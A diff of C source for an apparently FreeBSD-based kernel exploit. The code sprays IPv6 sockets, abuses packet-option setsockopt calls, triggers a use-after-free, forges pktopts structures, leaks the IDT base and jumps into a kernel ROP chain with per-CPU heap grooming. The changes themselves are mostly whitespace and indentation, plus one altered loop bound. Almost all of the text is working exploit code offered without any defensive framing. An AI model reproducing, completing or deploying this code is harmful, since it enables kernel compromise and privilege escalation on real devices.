@@ -23,6 +23,7 @@
 #define SPRAY_SIZE 32
 #define SPRAY_TOTAL 512
 
+
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
 #define free_pktopts(s) set_pktopts(s, NULL, 0)
@@ -67,6 +68,7 @@ struct opaque {
     int kevent_sock;
     int* spray_sock;
 };
+
 
 void cleanup_sockets(int *sockets, int count) {
     for (int i = 0; i < count; i++) {
@@ -170,6 +172,7 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
     return tclass & 0xffff;
 }
 
+
 // Invokes a string ROP to get the IDT base
 unsigned long long __builtin_gadget_addr(const char*);
 unsigned long long rop_call_funcptr(void(*)(void*), ...);
@@ -197,6 +200,7 @@ void sidt(unsigned long long* addr, unsigned short* size) {
     *addr = *(unsigned long long*)(buf + 2);
 }
 
+
 // Assign the process to a specific core
 void pin_to_cpu(int cpu) {
     cpuset_t set;
@@ -212,6 +216,7 @@ static void reset_ipv6_opts(int s) {
     struct in6_pktinfo z = {0};
     setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
 }
+
 
 // External inputs from gadgets and ROP buffers
 void (*enter_krop)(void);
@@ -265,14 +270,14 @@ int main() {
         .spray_sock = spray_sock
     };
 
-// The enter_krop chain is only executed after trigger_uaf() and fake_pktopts() is validated
-for (int attempts = 0; attempts < 10; attempts++) {
-    int overlap_idx = -1;
-    for (int i = 0; i < SPRAY_SIZE; i++) {
-        close(spray_sock[i]);
-        spray_sock[i] = new_socket();
-        if (spray_sock[i] < 0)
-            *(volatile int*)0;
+    // The enter_krop chain is only executed after trigger_uaf() and fake_pktopts() is validated
+    for (int attempts = 0; attempts < 10; attempts++) {
+        int overlap_idx = -1;
+        for (int i = 0; i < SPRAY_SIZE; i++) {
+            close(spray_sock[i]);
+            spray_sock[i] = new_socket();
+            if (spray_sock[i] < 0)
+                *(volatile int*)0;
     }
 
     trigger_uaf(&o);
@@ -323,8 +328,7 @@ for (int attempts = 0; attempts < 10; attempts++) {
     enter_krop();
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
-    }
-	
+}
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
@@ -344,7 +348,7 @@ for (int attempts = 0; attempts < 10; attempts++) {
 	pin_to_cpu(1);
 	rop_call_funcptr(spray_map, spray_sock, kernel_base); // Core 1 for spray_sock overlap
 
-    for (int cpu = 2; cpu < 7; cpu++) {
+    for (int cpu = 2; cpu <= 7; cpu++) {
         pin_to_cpu(cpu);
         rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays (Heap Grooming)
     }
@@ -357,6 +361,7 @@ for (int attempts = 0; attempts < 10; attempts++) {
     for (int i = 0; i < SPRAY_TOTAL; i++) if (spray_sock[i] >= 0) reset_ipv6_opts(spray_sock[i]);
     reset_ipv6_opts(master_sock);
     reset_ipv6_opts(kevent_sock);
+
 
     cleanup_sockets(spray_sock, SPRAY_TOTAL);
     close(kevent_sock);
